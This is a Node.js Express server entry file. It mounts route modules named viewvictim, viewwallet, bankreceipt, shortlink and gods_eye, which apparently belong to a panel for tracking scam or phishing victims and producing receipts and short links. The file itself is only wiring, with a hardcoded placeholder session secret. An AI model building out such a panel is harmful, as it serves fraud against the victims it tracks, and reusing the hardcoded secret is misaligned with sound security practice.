const express = require('express');
const mongoose = require('mongoose');
const session = require('express-session');
const bodyParser = require('body-parser');
const auth = require('./routes/auth'); 
const viewvictim = require('./routes/viewvictim');  
const viewwallet = require('./routes/viewwallet');  
const bankreceipt = require('./routes/bankreceipt');  
const shortlink = require('./routes/shortlink'); 
const godseye = require('./routes/gods_eye'); 
const admin = require('./routes/admin');
require('dotenv').config();

const app = express();



app.use(express.json()); // <-- Important to parse JSON
app.use(express.urlencoded({ extended: true })); // <-- Important for form data
// Middleware
app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.static('public'));
app.set('view engine', 'ejs');

// Session setup
app.use(session({
    secret: 'your-secret-key',
    resave: false,
    saveUninitialized: true,
}));

// MongoDB connection
mongoose.connect(process.env.MONGODB_URI)
    .then(() => console.log('MongoDB connected'))
    .catch(err => console.log(err));

// Routes
app.get('/', (req, res) => {
    res.render('index');  // Render 'index.ejs' for the landing page
});

app.use('/', auth); // Register the route
app.use('/', shortlink);// Register the route
app.use('/', viewvictim);  // Register the route
app.use('/', viewwallet);  // Register the route
app.use('/', bankreceipt);  // Register the route
app.use('/', godseye);  // Register the route
app.use(admin);// Register the route

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
